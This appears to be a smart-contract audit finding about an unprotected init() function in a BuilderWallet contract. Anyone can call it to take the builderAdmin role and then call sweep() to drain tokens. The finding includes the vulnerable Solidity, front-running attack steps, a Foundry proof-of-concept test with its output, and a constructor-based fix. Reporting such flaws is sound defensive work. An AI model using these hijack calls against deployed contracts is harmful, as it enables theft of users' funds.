  "body": "## Finding description and impact\nThe `BuilderWallet.init()` function is an **unprotected external function** with no access control that can be called by anyone, multiple times. This enables an attacker to hijack the `builderAdmin` role and gain complete control of the wallet, including the ability to call `sweep()` and steal all accumulated tokens.\n\n```solidity\ncontract BuilderWallet {\n    address public immutable FACTORY;\n    address public builderAdmin;\n\n    constructor(address factory) {\n        FACTORY = factory;\n    }\n\n@>    function init(address _builderAdmin) external {  // NO ACCESS CONTROL\n        builderAdmin = _builderAdmin;\n    }\n\n    function sweep(address token, address to) external {\n        if (msg.sender != builderAdmin) revert Errors.NotBuilder();\n        // ... transfers tokens ...\n    }\n}\n```\n\n1. `init()` is external with no access control or reentrancy protection\n2. Can be called by **anyone** and **multiple times**\n3. `builderAdmin` controls who can call `sweep()` and steal tokens\n\n### Attack Flow\n\n**Step 1: Owner initiates deployment**\n```solidity\n// Owner calls on RiskEngine (onlyOwner protected)\nRiskEngine.deployBuilder(builderCode=12345, builderAdmin=alice);\n```\n\n**Step 2: Owner's call gets mempool visibility**\nAttacker sees the pending transaction and can:\n1. Calculate the BuilderWallet address using public `predictBuilderWallet(12345)`\n2. Front-run or race the owner's `init()` call\n\n**Step 3: Attack execution**\n```solidity\n// Attacker front-runs owner's init() or calls it again after owner's init\nBuilderWallet(predicted_address).init(attacker_address);\n\n// Now attacker is builderAdmin and can steal tokens\nBuilderWallet(predicted_address).sweep(token, attacker_address);\n```\n\n### Impact\n- All tokens accumulated in BuilderWallet can be stolen\n- Builder fee shares lost\n- Protocol loses builder incentive revenue\n\n## Recommended mitigation steps\n\nMove init to constructor.\n```solidity\ncontract BuilderWallet {\n    address public immutable FACTORY;\n    address public immutable builderAdmin;  // Make immutable\n\n    constructor(address factory, address _builderAdmin) {\n        FACTORY = factory;\n        builderAdmin = _builderAdmin;\n    }\n    \n    // Remove init() entirely\n}",
  "proof_of_concept": "### Attack scenario:\n1. `BuilderWallet` is deployed with alice as intended `builderAdmin`\n2. Protocol accumulates tokens/fees in the wallet\n3. Attacker calls init(attacker) - NO ACCESS CONTROL\n4. Attacker becomes new `builderAdmin`\n5. Attacker can now call `sweep()` to steal all tokens\n\n### PoC\n1. Create `test/foundry/BuilderWalletTokenTheftTest.t.sol`:\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\nimport \"contracts/RiskEngine.sol\";\n\ncontract BuilderWalletTokenTheftTest is Test {\n    BuilderWallet public wallet;\n    \n    address public factory = address(0x1);\n    address public alice = address(0x2);\n    address public attacker = address(0x3);\n\n    function setUp() public {\n        // Deploy BuilderWallet\n        wallet = new BuilderWallet(factory);\n        \n        // Initialize wallet with alice as intended admin\n        wallet.init(alice);\n    }\n\n    /**\n     * @notice Attacker hijacks builderAdmin and gains complete control\n     */\n    function test_BuilderWallet_AdminHijack() public {\n        // Step 1: Verify initial state\n        console.log(\"STEP 1: Verify Initial State\");\n        console.log(\"  Wallet deployed with alice as builderAdmin\");\n        console.log(\"  Current builderAdmin:\", wallet.builderAdmin());\n        require(wallet.builderAdmin() == alice, \"Alice should be admin\");\n        console.log(\"  [OK] Alice is builderAdmin\\n\");\n        \n        // Step 2: Attacker calls init() to hijack\n        console.log(\"STEP 2: Attacker Calls init(attacker)\");\n        console.log(\"  Function signature: init(address _builderAdmin) external\");\n        console.log(\"  Access control: NONE!\");\n        console.log(\"  Already initialized guard: NONE!\");\n        console.log(\"  Calling: wallet.init(attacker)...\\n\");\n        \n        vm.prank(attacker);\n        wallet.init(attacker);\n        \n        // Step 3: Verify hijack\n        console.log(\"STEP 3: Verify Hijack Successful\");\n        console.log(\"  New builderAdmin:\", wallet.builderAdmin());\n        require(wallet.builderAdmin() == attacker, \"Attacker should be admin\");\n        console.log(\"  Attacker is now builderAdmin.\\n\");\n        \n        // Step 4: Show that attacker can call sweep()\n        console.log(\"STEP 4: Attacker Now Controls sweep() Function\");\n        console.log(\"  sweep() check: if (msg.sender != builderAdmin) revert;\");\n        console.log(\"  Since attacker IS builderAdmin, sweep() will succeed\");\n        console.log(\"  Attacker can now: wallet.sweep(token, attacker_address)\\n\");\n    }\n\n    /**\n     * @notice Multiple hijack attempts - last attacker wins\n     * \n     * Demonstrates that there's no protection against repeated hijacking\n     */\n    function test_RepeatedHijacking() public {\n        console.log(\"\\n=== Multiple Hijacking Attempts ===\\n\");\n        \n        require(wallet.builderAdmin() == alice);\n        console.log(\"Initial: Alice is builderAdmin\\n\");\n        \n        // First hijack\n        address attacker1 = address(0x1111111111111111111111111111111111111111);\n        vm.prank(attacker1);\n        wallet.init(attacker1);\n        require(wallet.builderAdmin() == attacker1);\n        console.log(\"Hijack #1: Attacker1 called init() -> Attacker1 is now admin\");\n        \n        // Second hijack (attacker1 loses control)\n        address attacker2 = address(0x2222222222222222222222222222222222222222);\n        vm.prank(attacker2);\n        wallet.init(attacker2);\n        require(wallet.builderAdmin() == attacker2);\n        console.log(\"Hijack #2: Attacker2 called init() -> Attacker2 took over from Attacker1\");\n        \n        // Alice tries to recover\n        vm.prank(alice);\n        wallet.init(alice);\n        require(wallet.builderAdmin() == alice);\n        console.log(\"Recovery: Alice called init() -> Alice regained control\\n\");\n        \n        // But attacker can hijack again\n        vm.prank(attacker);\n        wallet.init(attacker);\n        require(wallet.builderAdmin() == attacker);\n        console.log(\"Hijack #3: Attacker called init() again -> Back to Attacker\\n\");\n        console.log(\"           Alice cannot permanently secure her role\\n\");\n    }\n\n}\n```\n\n2. Run the test `forge test --match-path \"test/foundry/BuilderWalletTokenTheftTest.t.sol\" -vv`\n\nExpected result:\n\n```\nRan 2 tests for test/foundry/BuilderWalletTokenTheftTest.t.sol:BuilderWalletTokenTheftTest\n[PASS] test_BuilderWallet_AdminHijack() (gas: 32899)\nLogs:\n  STEP 1: Verify Initial State\n    Wallet deployed with alice as builderAdmin\n    Current builderAdmin: 0x0000000000000000000000000000000000000002\n    [OK] Alice is builderAdmin\n\n  STEP 2: Attacker Calls init(attacker)\n    Function signature: init(address _builderAdmin) external\n    Access control: NONE!\n    Already initialized guard: NONE!\n    Calling: wallet.init(attacker)...\n\n  STEP 3: Verify Hijack Successful\n    New builderAdmin: 0x0000000000000000000000000000000000000003\n    Attacker is now builderAdmin.\n\n  STEP 4: Attacker Now Controls sweep() Function\n    sweep() check: if (msg.sender != builderAdmin) revert;\n    Since attacker IS builderAdmin, sweep() will succeed\n    Attacker can now: wallet.sweep(token, attacker_address)\n\n\n[PASS] test_RepeatedHijacking() (gas: 32894)\nLogs:\n\n=== Multiple Hijacking Attempts ===\n\n  Initial: Alice is builderAdmin\n\n  Hijack #1: Attacker1 called init() -> Attacker1 is now admin\n  Hijack #2: Attacker2 called init() -> Attacker2 took over from Attacker1\n  Recovery: Alice called init() -> Alice regained control\n\n  Hijack #3: Attacker called init() again -> Back to Attacker\n\n             Alice cannot permanently secure her role\n\n\nSuite result: ok. 2 passed; 0 failed; 0 skipped; finished in 306.29µs (159.58µs CPU time)\n\nRan 1 test suite in 77.39ms (306.29µs CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)\n```",
